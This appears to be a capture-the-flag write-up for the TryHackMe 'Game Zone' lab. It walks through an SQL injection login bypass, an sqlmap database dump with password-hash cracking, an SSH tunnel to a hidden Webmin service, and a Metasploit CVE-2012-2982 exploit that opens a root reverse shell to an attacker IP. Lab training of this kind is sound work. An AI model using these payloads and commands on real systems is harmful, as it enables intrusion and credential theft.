# Game Zone

Link: [Game Zone](hhttps://tryhackme.com/room/gamezone)

## High-Level Overview

Hack into a machine using SQLMap, cracking passwords offline and revealing services using a reverse SSH tunnel.

## Tools Needed

* Nmap
* Gobuster
* BurpSuite
* SQLMap

## Walkthrough

Connect to the TryHackMe VPN using your `user.name.ovpn` configuration file you can download at `https://tryhackme.com/r/access` and the `openvpn` CLI tool:

```bash
$ sudo openvpn user.name.ovpn
```

Edit the `/etc/hosts` file on your machine to include the IP of the TryHackMe remote machine and a hostname you desire:

```bash
$ sudo nano /etc/hosts
```

```
MACHINE:IP     gamezone.thm
```

After starting the machine, we perform an initial scan using `nmap`:

```bash
$ sudo nmap -sS -p- -Pn -A -vv -T5 gamezone.thm
```

The following ports & services were identified:

* 22 - ssh
* 80 - http

Since there is a web application running, we can use `gobuster` for further enumeration:

```bash
$ gobuster dir -u http://gamezone.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php, php5, htm, html
$ gobuster vhost -u http://gamezone.thm -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt
```

We find 2 interesting results: `/index.php` and `/portal.php`.

On the main page of the application, we can log in using a simple SQL Injection attack by writing the SQL query `' or 1=1 -- -` in the `username` field, and leaving the `password` field blank.

There isn't much we can do now that we logged in, however, since this web application is vulnerable to SQL Injection, we can dump the whole database.

To do this, we must first make a web request by querying the vulnerable search field, and capture it using `BurpSuite`. The request looks like:

```
POST /portal.php HTTP/1.1
Host: MACHINE:IP
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://MACHINE:IP/portal.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Origin: http://MACHINE:IP
Connection: close
Cookie: PHPSESSID=hkjiiqj8ufdn64uc50tj0hrnt4
Upgrade-Insecure-Requests: 1

searchitem=1
```

We can save the request contents to a file named `request.txt` and then use `SQLMap` with the following command:

```bash
$ sqlmap -r request.txt --dbms=mysql --dump
# try cracking the hashes with a dictionary attack and select the following options to use a custom wordlist
# 2
# /usr/share/wordlists/rockyou.txt
```

After successfully running the command, we get some credentials:

```
+----------------------------------------------------------------------------------+----------+
| pwd                                                                              | username |
+----------------------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 (videogamer124) | agent47  |
+----------------------------------------------------------------------------------+----------+
```

The CTF tasks us with cracking the hash using `John the Ripper`. While we already did this using SQLMap, we can also use `John the Ripper`. Save the password hash to a file named `hash`, then use the following command:

```bash
john hash --wordlist /usr/share/wordlists/rockyou.txt --format=RAW-SHA256
```

With this set of credentials, we can log in on the machine using SSH:

```bash
$ ssh agent47@gamezone.thm
# videogamer124
```

In the home folder of `agent47` we can find our first flag, the file named `user.txt`.

Now that we have initial access to this machine, we need to find a way to escalate privileges.

The challenge tells us to investigate what socket connections are running on this host. In this SSH connection we can run the command:

```bash
$ ss -tulpn -t
```

The instructions say that a service running on port 10000 is blocked using a firewall rule. We need to expose this tunnel by running the following command on our attacking machine:

```bash
$ ssh -L 10000:localhost:10000 agent47@gamezone.thm
```

Still on our attacking machine, we can access this service by visiting `http://localhost:10000/` in our browser. Our previous credentials are still valid here and we can get access to the admin interface.

Next, we are tasked with using `Metasploit` and an appropriate payload to get root access.

We can search online for exploits affecting Webmin version 1.580. We come across this: `https://www.exploit-db.com/exploits/21851`.

We can open `Metasploit` on our machine and run the following instructions to configure our exploit:

```bash
$ msfconsole
> search CVE-2012-2982
> use 0
> set payload cmd/unix/reverse
> show options
# set up target variables
> set rhosts 127.0.0.1
# since we have a reverse ssh connection
> set rport 10000
> set username agent47
> set password videogamer124
> set lhost ATTACKER:IP
# replace with your IP
> set SSL false
> exploit
```

We should now have a reverse shell as `root`, which we can verify by typing `whoami`. Our final flag is located at `/root/root.txt`.